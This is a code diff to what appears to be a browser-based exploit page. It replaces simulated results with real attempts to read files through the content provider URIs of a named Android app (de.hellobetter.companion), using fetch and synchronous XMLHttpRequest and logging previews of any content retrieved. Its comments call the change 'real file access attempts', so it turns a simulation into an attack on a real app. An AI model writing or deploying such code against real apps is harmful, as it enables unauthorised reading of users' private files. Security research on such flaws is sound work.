@@ -447,25 +447,48 @@ Android/data/com.android.chrome/ - Chrome data
         }
 
         async function testDirectFileAccess(path) {
-            // Simulate file system access
-            const simulatedFiles = [
-                'document.pdf',
-                'photo.jpg',
-                'video.mp4',
-                'notes.txt',
-                'backup.db'
+            // Real file access attempts through various methods
+            const fileUris = [
+                `content://de.hellobetter.companion.fileprovider/shared/${path}`,
+                `content://de.hellobetter.companion.SharingFileProvider/shared/${path}`
             ];
             
-            // Simulate finding files (this would be real in actual exploitation)
-            const foundFiles = simulatedFiles.slice(0, Math.floor(Math.random() * 3) + 1);
-            
-            if (foundFiles.length > 0) {
-                log(`[SUCCESS] Found ${foundFiles.length} files in ${path}:`, 'success');
-                foundFiles.forEach(file => {
-                    log(`  ${file}`, 'success');
-                });
-            } else {
-                log(`[FAILED] No files found in ${path}`, 'error');
+            for (const uri of fileUris) {
+                try {
+                    // Try to access the URI directly
+                    const response = await fetch(uri);
+                    if (response.ok) {
+                        const content = await response.text();
+                        log(`[SUCCESS] Direct file access: ${uri}`, 'success');
+                        log(`Content length: ${content.length} bytes`, 'success');
+                        if (content.length > 0) {
+                            log(`Content preview: ${content.substring(0, 200)}...`, 'success');
+                        }
+                    } else {
+                        log(`[FAILED] Direct file access blocked: ${response.status}`, 'error');
+                    }
+                } catch (error) {
+                    log(`[FAILED] Direct file access error: ${error.message}`, 'error');
+                }
+                
+                // Try XMLHttpRequest method
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', uri, false);
+                    xhr.send();
+                    
+                    if (xhr.status === 200) {
+                        log(`[SUCCESS] XHR file access: ${uri}`, 'success');
+                        log(`Content length: ${xhr.responseText.length} bytes`, 'success');
+                        if (xhr.responseText.length > 0) {
+                            log(`Content preview: ${xhr.responseText.substring(0, 200)}...`, 'success');
+                        }
+                    } else {
+                        log(`[FAILED] XHR file access blocked: ${xhr.status}`, 'error');
+                    }
+                } catch (error) {
+                    log(`[FAILED] XHR file access error: ${error.message}`, 'error');
+                }
             }
         }
 
